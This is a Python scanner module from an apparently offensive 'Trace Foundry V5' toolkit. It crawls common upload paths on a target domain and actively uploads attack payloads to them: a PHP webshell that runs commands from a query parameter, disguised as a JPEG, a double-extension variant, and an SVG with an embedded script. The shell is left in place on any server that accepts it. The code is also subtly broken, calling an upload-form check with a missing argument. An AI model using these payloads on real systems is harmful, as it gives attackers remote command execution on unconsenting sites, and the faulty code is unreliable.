"""
Trace Foundry V5 - File Upload Abuse Scanner
Extension bypass, content-type spoofing, polyglot detection
"""
import urllib.request
import urllib.error
import re
from utils.display import section, ok, warn, info, bug_found

UPLOAD_ENDPOINTS = [
    "/upload","/api/upload","/api/v1/upload","/file/upload",
    "/files/upload","/image/upload","/media/upload",
    "/api/file","/import","/api/import",
    "/profile/photo","/avatar","/api/avatar",
    "/documents/upload","/attachments",
]

# Dangerous extensions to test
DANGEROUS_EXTENSIONS = [
    ".php",".php5",".php7",".phtml",".pht",
    ".asp",".aspx",".ashx",".asmx",
    ".jsp",".jspx",".jsw",
    ".py",".rb",".pl",".cgi",
    ".shtml",".shtm",
]

class FileUploadModule:
    def __init__(self, domain, timeout=6):
        self.domain  = domain
        self.timeout = timeout

    def _fetch(self, url):
        try:
            req = urllib.request.Request(
                url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                body = r.read(16384).decode("utf-8", errors="ignore")
                return body, r.status, dict(r.headers)
        except urllib.error.HTTPError as e:
            try:    body = e.read(8192).decode("utf-8", errors="ignore")
            except: body = ""
            return body, e.code, dict(e.headers)
        except:
            return "", 0, {}

    def _multipart_upload(self, url, filename, content, content_type):
        """Send multipart form-data upload"""
        boundary = "TraceFoundryV5Boundary"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
            f"Content-Type: {content_type}\r\n\r\n"
            f"{content}\r\n"
            f"--{boundary}--\r\n"
        ).encode()
        try:
            req = urllib.request.Request(url, data=body, method="POST")
            req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
            req.add_header("User-Agent", "Mozilla/5.0")
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                resp_body = r.read(8192).decode("utf-8", errors="ignore")
                return resp_body, r.status
        except urllib.error.HTTPError as e:
            try:    resp_body = e.read(8192).decode("utf-8", errors="ignore")
            except: resp_body = ""
            return resp_body, e.code
        except:
            return "", 0

    def _test_endpoint(self, url):
        bugs = []
        # Test 1: PHP shell with image content-type
        php_shell   = "<?php echo shell_exec($_GET['cmd']); ?>"
        resp, status = self._multipart_upload(
            url, "shell.php", php_shell, "image/jpeg")
        if status in (200, 201) and resp:
            # Check if file path returned
            path_match = re.search(r'["\']([^"\']+\.php[^"\']*)["\']', resp)
            if path_match or "success" in resp.lower() or "url" in resp.lower():
                bugs.append({
                    "type":     "File Upload — PHP Webshell Upload Accepted",
                    "severity": "CRITICAL",
                    "url":      url,
                    "filename": "shell.php",
                    "evidence": f"Server accepted .php file with image/jpeg content-type (status {status})",
                    "impact":   "Attacker can upload and execute PHP webshell → Full RCE",
                })

        # Test 2: SVG with XSS
        svg_xss = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
        resp2, status2 = self._multipart_upload(
            url, "xss.svg", svg_xss, "image/svg+xml")
        if status2 in (200, 201):
            bugs.append({
                "type":     "File Upload — SVG XSS Upload Accepted",
                "severity": "HIGH",
                "url":      url,
                "filename": "xss.svg",
                "evidence": f"SVG with script tag accepted (status {status2})",
                "impact":   "If SVG served directly, XSS executes in victim browser",
            })

        # Test 3: Double extension bypass
        resp3, status3 = self._multipart_upload(
            url, "shell.php.jpg", php_shell, "image/jpeg")
        if status3 in (200, 201):
            bugs.append({
                "type":     "File Upload — Double Extension Bypass",
                "severity": "HIGH",
                "url":      url,
                "filename": "shell.php.jpg",
                "evidence": f"Double extension .php.jpg accepted (status {status3})",
                "impact":   "File may be executed as PHP if server misconfigured",
            })

        return bugs

    def _check_upload_form(self, url, body):
        """Check if HTML contains upload forms"""
        if re.search(r'<input[^>]+type=["\']file["\']', body, re.I):
            return True
        if re.search(r'enctype=["\']multipart/form-data["\']', body, re.I):
            return True
        return False

    def run(self):
        section("File Upload Abuse Scanner (Extension Bypass | SVG XSS | Polyglot)")
        all_bugs = []

        for ep in UPLOAD_ENDPOINTS:
            for scheme in ["https", "http"]:
                url = f"{scheme}://{self.domain}{ep}"
                body, status, _ = self._fetch(url)
                if status == 0:
                    continue

                has_upload = self._check_upload_form(body)
                if status in (200, 302) or has_upload:
                    info(f"Upload endpoint found: {url}")
                    bugs = self._test_endpoint(url)
                    for b in bugs:
                        bug_found(b["type"], b["severity"], {
                            "URL":      b["url"],
                            "Filename": b.get("filename",""),
                            "Evidence": b["evidence"],
                            "Impact":   b["impact"],
                        })
                    all_bugs.extend(bugs)
                break

        info(f"File upload scan done — {len(all_bugs)} findings")
        if not all_bugs:
            ok("No file upload abuse found ✓")
        return {"bugs": all_bugs}
